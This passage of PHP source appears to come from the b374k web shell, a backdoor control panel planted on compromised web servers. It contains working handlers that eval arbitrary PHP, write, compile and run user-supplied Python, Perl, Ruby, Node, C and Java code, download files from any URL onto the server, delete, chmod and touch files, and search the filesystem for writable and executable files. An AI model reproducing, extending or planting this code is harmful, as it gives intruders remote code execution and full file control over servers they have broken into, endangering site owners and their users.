			}
			elseif($_GP['y']=='paste' && $s_massact=='copy'){
				$s_result .= notif("Copy here ? &lt;a href='".$s_self."z=copyok'&gt;Yes&lt;/a&gt; | &lt;a href='".$s_self."'&gt;No&lt;/a&gt;");
				foreach($s_lists as $s_l) $s_result .= notif($s_l);
			}
			elseif($_GP['y']=='chmod'){
				$s_result .= notif("Permissions ? &lt;form action='".$s_self."' method='post'&gt;&lt;input class='inputz' type='text' value='0755' name='chmodok' style='width:30px;text-align:center;' maxlength='4' /&gt;&lt;input class='inputzbut' name='z' type='submit' value='Go !' /&gt;&lt;/form&gt;");
				foreach($s_lists as $s_l) $s_result .= notif($s_l);
			}
			elseif($_GP['y']=='touch'){
				$s_result .= notif("Touch ? &lt;form action='".$s_self."' method='post'&gt;&lt;input class='inputz' type='text' value='".@date("d-M-Y H:i:s",time())."' name='touchok' style='width:130px;text-align:center;' /&gt;&lt;input class='inputzbut' name='z' type='submit' value='Go !' /&gt;&lt;/form&gt;");
				foreach($s_lists as $s_l) $s_result .= notif($s_l);
			}
			elseif($_GP['y']=='extractzip'){
				$s_result .= notif("Extract to ? &lt;form action='".$s_self."' method='post'&gt;&lt;input class='inputz' type='text' value='".$s_cwd."' name='extractzipok' style='width:50%;' /&gt;&lt;input class='inputzbut' name='z' type='submit' value='Go !' /&gt;&lt;/form&gt;");
				foreach($s_lists as $s_l) $s_result .= notif($s_l);
			}
			elseif($_GP['y']=='extracttar'){
				$s_result .= notif("Extract to ? &lt;form action='".$s_self."' method='post'&gt;&lt;input class='inputz' type='text' value='".$s_cwd."' name='extracttarok' style='width:50%;' /&gt;&lt;input class='inputzbut' name='z' type='submit' value='Go !' /&gt;&lt;/form&gt;");
				foreach($s_lists as $s_l) $s_result .= notif($s_l);
			}
			elseif($_GP['y']=='extracttargz'){
				$s_result .= notif("Extract to ? &lt;form action='".$s_self."' method='post'&gt;&lt;input class='inputz' type='text' value='".$s_cwd."' name='extracttargzok' style='width:50%;' /&gt;&lt;input class='inputzbut' name='z' type='submit' value='Go !' /&gt;&lt;/form&gt;");
				foreach($s_lists as $s_l) $s_result .= notif($s_l);
			}
			elseif($_GP['y']=='compresszip'){
				$s_result .= notif("Compress to ? &lt;form action='".$s_self."' method='post'&gt;&lt;input class='inputz' type='text' value='".$s_cwd.substr(md5(time()),0,8).".zip' name='compresszipok' style='width:50%;' /&gt;&lt;input class='inputzbut' name='z' type='submit' value='Go !' /&gt;&lt;/form&gt;");
				foreach($s_lists as $s_l) $s_result .= notif($s_l);
			}
			elseif($_GP['y']=='compresstar'){
				$s_result .= notif("Compress to ? &lt;form action='".$s_self."' method='post'&gt;&lt;input class='inputz' type='text' value='".$s_cwd.substr(md5(time()),0,8).".tar' name='compresstarok' style='width:50%;' /&gt;&lt;input class='inputzbut' name='z' type='submit' value='Go !' /&gt;&lt;/form&gt;");
				foreach($s_lists as $s_l) $s_result .= notif($s_l);
			}
			elseif($_GP['y']=='compresstargz'){
				$s_result .= notif("Compress to ? &lt;form action='".$s_self."' method='post'&gt;&lt;input class='inputz' type='text' value='".$s_cwd.substr(md5(time()),0,8).".tar.gz' name='compresstargzok' style='width:50%;' /&gt;&lt;input class='inputzbut' name='z' type='submit' value='Go !' /&gt;&lt;/form&gt;");
				foreach($s_lists as $s_l) $s_result .= notif($s_l);
			}
		}
	}

	// view image specified by ?img=&lt;file&gt;
	if(isset($_GP['img'])){
		ob_end_clean();
		$s_d = isset($_GP['d'])? $_GP['d']:"";
		$s_f = $_GP['img'];
		$s_inf = @getimagesize($s_d.$s_f);
		$s_ext = explode($s_f, ".");
		$s_ext = $s_ext[count($s_ext)-1];
	 	header("Content-type: ".$s_inf["mime"]);
	 	header("Cache-control: public");
		header("Expires: ".@date("r", @mktime(0,0,0,1,1,2030)));
		header("Cache-control: max-age=".(60*60*24*7));#
	 	readfile($s_d.$s_f);
	 	die();
	} // rename file or folder
	elseif(isset($_GP['oldname']) && isset($_GP['rename'])){
		$s_old = $_GP['oldname'];
		$s_new = $_GP['rename'];

		$s_renmsg = "";
		if(@is_dir($s_old)) $s_renmsg = (@rename($s_old, $s_new))? "Directory ".$s_old." renamed to ".$s_new : "Unable to rename directory ".$s_old." to ".$s_new;
		elseif(@is_file($s_old)) $s_renmsg = (@rename($s_old, $s_new))? "File ".$s_old." renamed to ".$s_new : "Unable to rename file ".$s_old." to ".$s_new;
		else $s_renmsg = "Cannot find the path specified ".$s_old;

		$s_result .= notif($s_renmsg);
		$s_fnew = $s_new;
	} // confirm delete
	elseif(!empty($_GP['del'])){
		$s_del = trim($_GP['del']);
		$s_result .= notif("Delete ".basename($s_del)." ? &lt;a href='".$s_self."delete=".$s_del."'&gt;Yes&lt;/a&gt; | &lt;a href='".$s_self."'&gt;No&lt;/a&gt;");
	} // delete file
	elseif(!empty($_GP['delete'])){
		$s_f = $_GP['delete'];
		$s_delmsg = "";

		if(@is_file($s_f)) $s_delmsg = (unlink($s_f))? "File removed : ".$s_f : "Unable to remove file ".$s_f;
		elseif(@is_dir($s_f)){
			rmdirs($s_f);
			$s_delmsg = (@is_dir($s_f))? "Unable to remove directory ".$s_f : "Directory removed : ".$s_f;
		}
		else $s_delmsg = "Cannot find the path specified ".$s_f;
		$s_result .= notif($s_delmsg);
	} // create dir
	elseif(!empty($_GP['mkdir'])){
		$s_f = $s_cwd.$_GP['mkdir'];
		$s_dirmsg = "";

		$s_num = 1;
		if(@is_dir($s_f)){
			$s_pos = strrpos($s_f,"_");
			if($s_pos!==false) $s_num = (int) substr($s_f, $s_pos+1);
			while(@is_dir(substr($s_f, 0, $s_pos)."_".$s_num)){
				$s_num++;
			}
			$s_f = substr($s_f, 0, $s_pos)."_".$s_num;
		}
		if(mkdir($s_f)) $s_dirmsg = "Directory created ".$s_f;
		else $s_dirmsg = "Unable to create directory ".$s_f;

		$s_result .= notif($s_dirmsg);
	} // php eval() function
	if(isset($_GP['x']) && ($_GP['x']=='eval')){
		$s_code = "";
		$s_res = "";
		$s_evaloption = "";
		$s_lang = "php";

		if(isset($_GP['evalcode'])){
			$s_code = $_GP['evalcode'];
			$s_evaloption = (isset($_GP['evaloption']))? $_GP['evaloption']:"";
			$s_tmpdir = get_writabledir();

			if(isset($_GP['lang'])){$s_lang = $_GP['lang'];}

			if(strtolower($s_lang)=='php'){
				ob_start();
				eval($s_code);
				$s_res = ob_get_contents();
				ob_end_clean();
			}
			elseif(strtolower($s_lang)=='python'||strtolower($s_lang)=='perl'||strtolower($s_lang)=='ruby'||strtolower($s_lang)=='node'){
				$s_rand = md5(time().rand(0,100));
				$s_script = $s_tmpdir.$s_rand;
				if(file_put_contents($s_script, $s_code)!==false){
					$s_res = exe($s_lang." ".$s_evaloption." ".$s_script);
					unlink($s_script);
				}
			}
			elseif(strtolower($s_lang)=='gcc'){
				$s_script = md5(time().rand(0,100));
				chdir($s_tmpdir);
				if(file_put_contents($s_script.".c", $s_code)!==false){
					$s_scriptout = $s_win ? $s_script.".exe" : $s_script;
					$s_res = exe("gcc ".$s_script.".c -o ".$s_scriptout.$s_evaloption);
					if(@is_file($s_scriptout)){
						$s_res = $s_win ? exe($s_scriptout):exe("chmod +x ".$s_scriptout." ; ./".$s_scriptout);
						rename($s_scriptout, $s_scriptout."del");
						unlink($s_scriptout."del");
					}
					unlink($s_script.".c");
				}
				chdir($s_cwd);
			}
			elseif(strtolower($s_lang)=='java'){
				if(preg_match("/class\ ([^{]+){/i",$s_code, $s_r)){
					$s_classname = trim($s_r[1]);
					$s_script = $s_classname;
				}
				else{
					$s_rand = "b374k_".substr(md5(time().rand(0,100)),0,8);
					$s_script = $s_rand;
					$s_code = "class ".$s_rand." { ".$s_code . " } ";
				}
				chdir($s_tmpdir);
				if(file_put_contents($s_script.".java", $s_code)!==false){
					$s_res = exe("javac ".$s_script.".java");
					if(@is_file($s_script.".class")){
						$s_res .= exe("java ".$s_evaloption." ".$s_script);
						unlink($s_script.".class");
					}
					unlink($s_script.".java");
				}
				chdir($s_pwd);
			}
		}

		$s_lang_available = "&lt;option value='php'&gt;php&lt;/option&gt;";
		$s_selected = "";
		$s_access = array("s_python", "s_perl", "s_ruby", "s_node", "s_gcc", "s_java");
		foreach($s_access as $s){
			if(isset($$s)){
				$s_t = explode("_", $s);
				$s_checked = ($s_lang == $s_t[1])? "selected" : "";
				$s_lang_available .= "&lt;option value='".$s_t[1]."' ".$s_checked."&gt;".$s_t[1]."&lt;/option&gt;";
			}
		}

		$s_evaloptionclass = ($s_lang=="php")? "sembunyi":"";
		$s_e_result = (!empty($s_res))? "&lt;pre id='evalres' class='border-top' style='margin:4px 0 0 0;padding:6px 0;' &gt;".hss($s_res)."&lt;/pre&gt;":"";
		$s_result .= "&lt;form action='".$s_self."' method='post'&gt;
					&lt;textarea id='evalcode' name='evalcode' style='height:150px;' class='txtarea'&gt;".hss($s_code)."&lt;/textarea&gt;
					&lt;table&gt;&lt;tr&gt;&lt;td style='padding:0;'&gt;&lt;p&gt;&lt;input type='submit' name='evalcodesubmit' class='inputzbut' value='Go !' style='width:120px;height:30px;' /&gt;&lt;/p&gt;
					&lt;/td&gt;&lt;td&gt;&lt;select name='lang' onchange='evalselect(this);' class='inputzbut' style='width:120px;height:30px;padding:4px;'&gt;
					".$s_lang_available."
					&lt;/select&gt;
					&lt;/td&gt;
					&lt;td&gt;&lt;div title='If you want to give additional option to interpreter or compiler, give it here' id='additionaloption' class='".$s_evaloptionclass."'&gt;Additional option&nbsp;&nbsp;&lt;input class='inputz' style='width:400px;' type='text' name='evaloption' value='".$s_evaloption."' id='evaloption' /&gt;&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
					&lt;/table&gt;
					".$s_e_result."
					&lt;input type='hidden' name='x' value='eval' /&gt;
					&lt;/form&gt;";
	} // find
	elseif(isset($_GP['find'])){
		$s_p = $_GP['find'];

		$s_type = isset($_GP['type'])? $_GP['type'] : "sfile";
		$s_sfname = (!empty($_GP['sfname']))? $_GP['sfname']:'';
		$s_sdname = (!empty($_GP['sdname']))? $_GP['sdname']:'';
		$s_sfcontain = (!empty($_GP['sfcontain']))? $_GP['sfcontain']:'';

		$s_sfnameregexchecked = $s_sfnameicasechecked = $s_sdnameregexchecked = $s_sdnameicasechecked = $s_sfcontainregexchecked = $s_sfcontainicasechecked = $s_swritablechecked = $s_sreadablechecked = $s_sexecutablechecked = "";
		$s_sfnameregex = $s_sfnameicase = $s_sdnameregex = $s_sdnameicase = $s_sfcontainregex = $s_sfcontainicase = $s_swritable = $s_sreadable = $s_sexecutable = false;

		if(isset($_GP['sfnameregex'])){ $s_sfnameregex=true; $s_sfnameregexchecked="checked"; }
		if(isset($_GP['sfnameicase'])){ $s_sfnameicase=true; $s_sfnameicasechecked="checked"; }
		if(isset($_GP['sdnameregex'])){ $s_sdnameregex=true; $s_sdnameregexchecked="checked"; }
		if(isset($_GP['sdnameicase'])){ $s_sdnameicase=true; $s_sdnameicasechecked="checked"; }
		if(isset($_GP['sfcontainregex'])){ $s_sfcontainregex=true; $s_sfcontainregexchecked="checked"; }
		if(isset($_GP['sfcontainicase'])){ $s_sfcontainicase=true; $s_sfcontainicasechecked="checked"; }
		if(isset($_GP['swritable'])){ $s_swritable=true; $s_swritablechecked="checked"; }
		if(isset($_GP['sreadable'])){ $s_sreadable=true; $s_sreadablechecked="checked"; }
		if(isset($_GP['sexecutable'])){ $s_sexecutable=true; $s_sexecutablechecked="checked"; }

		$s_sexecb = (function_exists("is_executable"))? "&lt;input class='css-checkbox' type='checkbox' name='sexecutable' value='sexecutable' id='se' ".$s_sexecutablechecked." /&gt;&lt;label class='css-label' for='se'&gt;Executable&lt;/span&gt;":"";

		$s_candidate = array();
		if(isset($_GP['sgo'])){
			$s_af = "";

			$s_candidate = getallfiles($s_p);
			if($s_type=='sfile') $s_candidate = @array_filter($s_candidate, "is_file");
			elseif($s_type=='sdir') $s_candidate = @array_filter($s_candidate, "is_dir");

			foreach($s_candidate as $s_a){
				if($s_type=='sdir'){
					if(!empty($s_sdname)){
						if($s_sdnameregex){
							if($s_sdnameicase){if(!preg_match("/".$s_sdname."/i", basename($s_a))) $s_candidate = array_diff($s_candidate, array($s_a));}
							else{if(!preg_match("/".$s_sdname."/", basename($s_a))) $s_candidate = array_diff($s_candidate, array($s_a));}
						}
						else{
							if($s_sdnameicase){if(strpos(strtolower(basename($s_a)), strtolower($s_sdname))===false) $s_candidate = array_diff($s_candidate, array($s_a));}
							else{if(strpos(basename($s_a), $s_sdname)===false) $s_candidate = array_diff($s_candidate, array($s_a));}
						}
					}
				}
				elseif($s_type=='sfile'){
					if(!empty($s_sfname)){
						if($s_sfnameregex){
							if($s_sfnameicase){if(!preg_match("/".$s_sfname."/i", basename($s_a))) $s_candidate = array_diff($s_candidate, array($s_a));}
							else{if(!preg_match("/".$s_sfname."/", basename($s_a))) $s_candidate = array_diff($s_candidate, array($s_a));}
						}
						else{
							if($s_sfnameicase){if(strpos(strtolower(basename($s_a)), strtolower($s_sfname))===false) $s_candidate = array_diff($s_candidate, array($s_a));}
							else{if(strpos(basename($s_a), $s_sfname)===false) $s_candidate = array_diff($s_candidate, array($s_a));}
						}
					}
					if(!empty($s_sfcontain)){
						$s_sffcontent = @file_get_contents($s_a);
						if($s_sfcontainregex){
							if($s_sfcontainicase){if(!preg_match("/".$s_sfcontain."/i", $s_sffcontent)) $s_candidate = array_diff($s_candidate, array($s_a));}
							else{if(!preg_match("/".$s_sfcontain."/",  $s_sffcontent)) $s_candidate = array_diff($s_candidate, array($s_a));}
						}
						else{
							if($s_sfcontainicase){if(strpos(strtolower($s_sffcontent), strtolower($s_sfcontain))===false) $s_candidate = array_diff($s_candidate, array($s_a));}
							else{if(strpos($s_sffcontent, $s_sfcontain)===false) $s_candidate = array_diff($s_candidate, array($s_a));}
						}
					}
				}
			}
		}

		$s_f_result = ""; $s_link="";
		foreach($s_candidate as $s_c){
			$s_c = trim($s_c);
			if($s_swritable && !@is_writable($s_c)) continue;
			if($s_sreadable && !@is_readable($s_c)) continue;
			if($s_sexecutable && !@is_executable($s_c)) continue;

			if($s_type=="sfile") $s_link = $s_self."view=".$s_c;
			elseif($s_type=="sdir") $s_link = $s_self."view=".cp($s_c);
			$s_f_result .= "&lt;p class='notif' ondblclick=\"return go('".adds($s_link)."',event);\"&gt;&lt;a href='".$s_link."'&gt;".$s_c."&lt;/a&gt;&lt;/p&gt;";
		}

		$s_tsdir = ($s_type=="sdir")? "selected":"";
		$s_tsfile = ($s_type=="sfile")? "selected":"";

		if(!@is_dir($s_p)) $s_result .= notif("Cannot find the path specified ".$s_p);

		$s_result .= "&lt;form action='".$s_self."' method='post'&gt;
		&lt;div class='mybox'&gt;&lt;h2&gt;Find&lt;/h2&gt;
		&lt;table class='myboxtbl'&gt;
		&lt;tr&gt;&lt;td style='width:140px;'&gt;Search in&lt;/td&gt;
		&lt;td colspan='2'&gt;&lt;input style='width:100%;' value='".$s_p."' class='inputz' type='text' name='find' /&gt;&lt;/td&gt;&lt;/tr&gt;
		&lt;tr onclick=\"findtype('sdir');\"&gt;
			&lt;td&gt;Dirname contains&lt;/td&gt;
			&lt;td style='width:400px;'&gt;&lt;input class='inputz' style='width:100%;' type='text' name='sdname' value='".$s_sdname."' /&gt;&lt;/td&gt;
			&lt;td&gt;
				&lt;input type='checkbox' class='css-checkbox' name='sdnameregex' id='sdn' ".$s_sdnameregexchecked." /&gt;&lt;label class='css-label' for='sdn'&gt;Regex (pcre)&lt;/label&gt;
				&lt;input type='checkbox' class='css-checkbox' name='sdnameicase' id='sdi' ".$s_sdnameicasechecked." /&gt;&lt;label class='css-label' for='sdi'&gt;Case Insensitive&lt;/label&gt;
			&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr onclick=\"findtype('sfile');\"&gt;
			&lt;td&gt;Filename contains&lt;/td&gt;
			&lt;td style='width:400px;'&gt;&lt;input class='inputz' style='width:100%;' type='text' name='sfname' value='".$s_sfname."' /&gt;&lt;/td&gt;
			&lt;td&gt;
				&lt;input type='checkbox' class='css-checkbox' name='sfnameregex'  id='sfn' ".$s_sfnameregexchecked." /&gt;&lt;label class='css-label' for='sfn'&gt;Regex (pcre)&lt;/label&gt;
				&lt;input type='checkbox' class='css-checkbox' name='sfnameicase'  id='sfi' ".$s_sfnameicasechecked." /&gt;&lt;label class='css-label' for='sfi'&gt;Case Insensitive&lt;/label&gt;
			&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr onclick=\"findtype('sfile');\"&gt;
			&lt;td&gt;File contains&lt;/td&gt;
			&lt;td style='width:400px;'&gt;&lt;input class='inputz' style='width:100%;' type='text' name='sfcontain' value='".$s_sfcontain."' /&gt;&lt;/td&gt;
			&lt;td&gt;
				&lt;input type='checkbox' class='css-checkbox' name='sfcontainregex' id='sff' ".$s_sfcontainregexchecked." /&gt;&lt;label class='css-label' for='sff'&gt;Regex (pcre)&lt;/label&gt;
				&lt;input type='checkbox' class='css-checkbox' name='sfcontainicase' id='sffi' ".$s_sfcontainicasechecked." /&gt;&lt;label class='css-label' for='sffi'&gt;Case Insensitive&lt;/label&gt;
			&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td&gt;Permissions&lt;/td&gt;
			&lt;td colspan='2'&gt;
				&lt;input type='checkbox' class='css-checkbox' name='swritable' id='sw' ".$s_swritablechecked." /&gt;&lt;label class='css-label' for='sw'&gt;Writable&lt;/label&gt;
				&lt;input type='checkbox' class='css-checkbox' name='sreadable' id='sr' ".$s_sreadablechecked." /&gt;&lt;label class='css-label' for='sr'&gt;Readable&lt;/label&gt;
				".$s_sexecb."
			&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;&lt;td&gt;
		&lt;input type='submit' name='sgo' class='inputzbut' value='Search !' style='width:120px;height:30px;margin:0;' /&gt;
		&lt;/td&gt;
		&lt;td&gt;
		&lt;select name='type' id='type' class='inputzbut' style='width:120px;height:30px;margin:0;padding:4px;'&gt;
			&lt;option value='sfile' ".$s_tsfile."&gt;Search file&lt;/option&gt;
			&lt;option value='sdir' ".$s_tsdir."&gt;Search dir&lt;/option&gt;
		&lt;/select&gt;
		&lt;/td&gt;
		&lt;td&gt;&lt;/td&gt;&lt;/tr&gt;
		&lt;/table&gt;
		&lt;/div&gt;
		&lt;/form&gt;
		&lt;div&gt;
		".$s_f_result."
		&lt;/div&gt;";
	} // upload
	elseif(isset($_GP['x']) && ($_GP['x']=='upload')){
		$s_result = " ";
		$s_msg = "";
		if(isset($_GP['uploadhd'])){
			$c = count($_FILES['filepath']['name']);
			for($i = 0; $i&lt;$c; $i++){
				$s_fn = $_FILES['filepath']['name'][$i];
				if(empty($s_fn)) continue;
				if(is_uploaded_file($_FILES['filepath']['tmp_name'][$i])){
					$s_p = cp($_GP['savefolder'][$i]);
					if(!@is_dir($s_p)) mkdir($s_p);
					if(isset($_GP['savefilename'][$i]) && (trim($_GP['savefilename'][$i])!="")) $s_fn = $_GP['savefilename'][$i];
					$s_tm = $_FILES['filepath']['tmp_name'][$i];
					$s_pi = cp($s_p).$s_fn;
					$s_st = @move_uploaded_file($s_tm,$s_pi);
					if($s_st) $s_msg .= notif("File uploaded to &lt;a href='".$s_self."view=".$s_pi."'&gt;".$s_pi."&lt;/a&gt;");
					else $s_msg .= notif("Failed to upload ".$s_fn);
				}
				else $s_msg .= notif("Failed to upload ".$s_fn);
			}
		}
		elseif(isset($_GP['uploadurl'])){
			// function dlfile($s_url,$s_fpath)
			$c = count($_GP['fileurl']);
			for($i = 0; $i&lt;$c; $i++){
				$s_fu = $_GP['fileurl'][$i];
				if(empty($s_fu)) continue;

				$s_p = cp($_GP['savefolderurl'][$i]);
				if(!@is_dir($s_p)) mkdir($s_p);

				$s_fn = basename($s_fu);
				if(isset($_GP['savefilenameurl'][$i]) && (trim($_GP['savefilenameurl'][$i])!="")) $s_fn = $_GP['savefilenameurl'][$i];
				$s_fp = cp($s_p).$s_fn;
				$s_st = dlfile($s_fu,$s_fp);
				if($s_st) $s_msg .= notif("File uploaded to &lt;a href='".$s_self."view=".$s_fp."'&gt;".$s_fp."&lt;/a&gt;");
				else $s_msg .= notif("Failed to upload ".$s_fn);
			}
		}
		else{
			if(!@is_writable($s_cwd)) $s_msg = notif("Directory ".$s_cwd." is not writable, please change to a writable one");
		}

		if(!empty($s_msg)) $s_result .= $s_msg;
		$s_result .= "
			&lt;form action='".$s_self."' method='post' enctype='multipart/form-data'&gt;
			&lt;div class='mybox'&gt;&lt;h2&gt;&lt;div class='but' onclick='adduploadc();'&gt;+&lt;/div&gt;Upload from computer&lt;/h2&gt;
			&lt;table class='myboxtbl'&gt;
			&lt;tbody id='adduploadc'&gt;
			&lt;tr&gt;&lt;td style='width:140px;'&gt;File&lt;/td&gt;&lt;td&gt;&lt;input type='file' name='filepath[]' class='inputzbut' style='width:400px;margin:0;' /&gt;&lt;/td&gt;&lt;/tr&gt;
			&lt;tr&gt;&lt;td&gt;Save to&lt;/td&gt;&lt;td&gt;&lt;input style='width:100%;' class='inputz' type='text' name='savefolder[]' value='".$s_cwd."' /&gt;&lt;/td&gt;&lt;/tr&gt;
			&lt;tr&gt;&lt;td&gt;Filename (optional)&lt;/td&gt;&lt;td&gt;&lt;input style='width:100%;' class='inputz' type='text' name='savefilename[]' value='' /&gt;&lt;/td&gt;&lt;/tr&gt;
			&lt;/tbody&gt;
			&lt;tfoot&gt;
			&lt;tr&gt;&lt;td&gt;&nbsp;&lt;/td&gt;&lt;td&gt;
			&lt;input type='submit' name='uploadhd' class='inputzbut' value='Upload !' style='width:120px;height:30px;margin:10px 2px 0 2px;' /&gt;
			&lt;input type='hidden' name='x' value='upload' /&gt;
			&lt;/td&gt;&lt;/tr&gt;
			&lt;/tfoot&gt;
			&lt;/table&gt;
			&lt;/div&gt;
			&lt;/form&gt;
			&lt;form action='".$s_self."' method='post'&gt;
			&lt;div class='mybox'&gt;&lt;h2&gt;&lt;div class='but' onclick='adduploadi();'&gt;+&lt;/div&gt;Upload from internet&lt;/h2&gt;
			&lt;table class='myboxtbl'&gt;
			&lt;tbody id='adduploadi'&gt;
			&lt;tr&gt;&lt;td style='width:150px;'&gt;File URL&lt;/td&gt;&lt;td&gt;&lt;input style='width:100%;' class='inputz' type='text' name='fileurl[]' value='' /&gt;
			&lt;/td&gt;&lt;/tr&gt;
			&lt;tr&gt;&lt;td&gt;Save to&lt;/td&gt;&lt;td&gt;&lt;input style='width:100%;' class='inputz' type='text' name='savefolderurl[]' value='".$s_cwd."' /&gt;&lt;/td&gt;&lt;/tr&gt;
			&lt;tr&gt;&lt;td&gt;Filename (optional)&lt;/td&gt;&lt;td&gt;&lt;input style='width:100%;' class='inputz' type='text' name='savefilenameurl[]' value='' /&gt;&lt;/td&gt;&lt;/tr&gt;
			&lt;/tbody&gt;
			&lt;tfoot&gt;
			&lt;tr&gt;&lt;td&gt;&nbsp;&lt;/td&gt;&lt;td&gt;
			&lt;input type='submit' name='uploadurl' class='inputzbut' value='Upload !' style='width:120px;height:30px;margin:10px 2px 0 2px;' /&gt;
			&lt;input type='hidden' name='x' value='upload' /&gt;
			&lt;/td&gt;&lt;/tr&gt;
			&lt;/table&gt;
			&lt;/div&gt;
			&lt;/form&gt;";
	} // view file
	elseif(isset($_GP['view'])){
		$s_f = $_GP['view'];
		if(isset($s_fnew) && (trim($s_fnew)!="")) $s_f = $s_fnew;

		$s_owner = "";
		if(@is_file($s_f)){
			$targetdir = dirname($s_f);
			chdir($targetdir);
			$s_cwd = cp(getcwd());
			setcookie("cwd", $s_cwd ,time() + $s_login_time);

			if(!$s_win && $s_posix){
				$s_name = posix_getpwuid(fileowner($s_f));
				$s_group = posix_getgrgid(filegroup($s_f));
				$s_owner = "&lt;tr&gt;&lt;td&gt;Owner&lt;/td&gt;&lt;td&gt;".$s_name['name']."&lt;span class='gaya'&gt;:&lt;/span&gt;".$s_group['name']."&lt;/td&gt;&lt;/tr&gt;";
			}
			$s_filn = basename($s_f);
			$s_dlfile = get_archiver_available();
			$s_dlfile = str_replace("__dlpath__",$s_filn,$s_dlfile);
			$s_dlfile = str_replace("__dlcwd__",$s_cwd,$s_dlfile);
			$s_result .= "&lt;table class='viewfile' style='width:100%;'&gt;
			&lt;tr&gt;&lt;td style='width:140px;'&gt;Filename&lt;/td&gt;&lt;td&gt;&lt;span id='".cs($s_filn)."_link'&gt;".$s_f."&lt;/span&gt;
			&lt;div id='".cs($s_filn)."_form' class='sembunyi'&gt;
			&lt;form action='".$s_self."' method='post'&gt;
				&lt;input type='hidden' name='oldname' value='".$s_f."' style='margin:0;padding:0;' /&gt;
				&lt;input type='hidden' name='view' value='".$s_f."' /&gt;
				&lt;input class='inputz' style='width:200px;' type='text' name='rename' value='".$s_f."' /&gt;
				&lt;input class='inputzbut' type='submit' value='rename' /&gt;
			&lt;/form&gt;
			&lt;input class='inputzbut' type='button' value='x' onclick=\"tukar_('".cs($s_filn)."_form','".cs($s_filn)."_link');\" /&gt;
			&lt;/div&gt;
			&lt;/td&gt;&lt;/tr&gt;
			&lt;tr&gt;&lt;td&gt;Size&lt;/td&gt;&lt;td&gt;".gs($s_f)." (".@filesize($s_f).")&lt;/td&gt;&lt;/tr&gt;
			&lt;tr&gt;&lt;td&gt;Permission&lt;/td&gt;&lt;td&gt;".gp($s_f)."&lt;/td&gt;&lt;/tr&gt;
			".$s_owner."
			&lt;tr&gt;&lt;td&gt;Create time&lt;/td&gt;&lt;td&gt;".@date("d-M-Y H:i:s",filectime($s_f))."&lt;/td&gt;&lt;/tr&gt;
			&lt;tr&gt;&lt;td&gt;Last modified&lt;/td&gt;&lt;td&gt;".@date("d-M-Y H:i:s",filemtime($s_f))."&lt;/td&gt;&lt;/tr&gt;
			&lt;tr&gt;&lt;td&gt;Last accessed&lt;/td&gt;&lt;td&gt;".@date("d-M-Y H:i:s",fileatime($s_f))."&lt;/td&gt;&lt;/tr&gt;
			&lt;tr&gt;&lt;td&gt;Actions&lt;/td&gt;&lt;td&gt;
			&lt;a href='".$s_self."edit=".$s_f."' title='edit'&gt;edit&lt;/a&gt; | &lt;a href='".$s_self."hexedit=".$s_f."' title='edit as hex'&gt;hex&lt;/a&gt; | &lt;a href=\"javascript:tukar_('".cs($s_filn)."_link','".cs($s_filn)."_form');\" title='rename'&gt;ren&lt;/a&gt; | &lt;a href='".$s_self."del=".$s_f."' title='delete'&gt;del&lt;/a&gt; ".$s_dlfile."
			&lt;/td&gt;&lt;/tr&gt;
			&lt;tr&gt;&lt;td&gt;View&lt;/td&gt;&lt;td&gt;
			&lt;a href='".$s_self."view=".$s_f."&type=text'&gt;text&lt;/a&gt; | &lt;a href='".$s_self."view=".$s_f."&type=code'&gt;code&lt;/a&gt; | &lt;a href='".$s_self."view=".$s_f."&type=image'&gt;image&lt;/a&gt; | &lt;a href='".$s_self."view=".$s_f."&type=audio'&gt;audio&lt;/a&gt; | &lt;a href='".$s_self."view=".$s_f."&type=video'&gt;video&lt;/a&gt;
			&lt;/td&gt;&lt;/tr&gt;
			&lt;/table&gt;";

			$s_t = ""; $s_mime = "";
			$s_mime_list = gzinflate(base64_decode($s_mime_types));
			$s_ext_pos = strrpos($s_f, ".");
			if($s_ext_pos!==false){
				$s_ext = trim(substr($s_f, $s_ext_pos),".");
				if(preg_match("/([^\s]+)\ .*\b".$s_ext."\b.*/i",$s_mime_list,$s_r)){
					$s_mime = $s_r[1];
				}
			}

			$s_iinfo = @getimagesize($s_f);
			if(strtolower(substr($s_filn,-3,3)) == "php") $s_t = "code";
			elseif(is_array($s_iinfo)) $s_t = 'image';
			elseif(!empty($s_mime)) $s_t = substr($s_mime,0,strpos($s_mime,"/"));

			if(isset($_GP['type'])) $s_t = $_GP['type'];

			if($s_t=="image"){
				$s_width = (int) $s_iinfo[0];
				$s_height = (int) $s_iinfo[1];
				$s_imginfo = "Image type = ( ".$s_iinfo['mime']." )&lt;br /&gt;
					Image Size = &lt;span class='gaul'&gt;( &lt;/span&gt;".$s_width." x ".$s_height."&lt;span class='gaul'&gt; )&lt;/span&gt;&lt;br /&gt;";
				if($s_width &gt; 800){
					$s_width = 800;
					$s_imglink = "&lt;p&gt;&lt;a href='".$s_self."img=".$s_filn."'&gt;
					&lt;span class='gaul'&gt;[ &lt;/span&gt;view full size&lt;span class='gaul'&gt; ]&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;";
				}
				else $s_imglink = "";

				$s_result .= "&lt;div class='viewfilecontent' style='text-align:center;'&gt;".$s_imglink."
					&lt;img width='".$s_width."' src='".$s_self."img=".$s_filn."' alt='".$s_filn."' style='margin:8px auto;padding:0;border:0;' /&gt;&lt;/div&gt;";

			}
			elseif($s_t=="code"){
				$s_result .= "&lt;div class=\"viewfilecontent\"&gt;";
				$s_file = wordwrap(@file_get_contents($s_f),160,"\n",true);
				$s_buff = highlight_string($s_file,true);
				$s_old = array("0000BB", "000000", "FF8000", "DD0000", "007700");
				$s_new = ($s_theme=="bright")? $s_highlight_bright:$s_highlight_dark;
				$s_buff = str_replace($s_old,$s_new, $s_buff);
				$s_result .= $s_buff;
				$s_result .=  "&lt;/div&gt;";
			}
			elseif($s_t=="audio" || $s_t=="video"){
				$s_result .= "&lt;div class='viewfilecontent' style='text-align:center;'&gt;
							&lt;".$s_t." controls&gt;
							&lt;source src='".$s_self."dltype=raw&dlpath=".$s_f."' type='".$s_mime."'&gt;
								&lt;object data='".$s_self."dltype=raw&dlpath=".$s_f."'&gt;
									&lt;embed src='".$s_self."dltype=raw&dlpath=".$s_f."'&gt;
								&lt;/object&gt;
							&lt;/".$s_t."&gt;
							&lt;/div&gt;";
			}
			else {
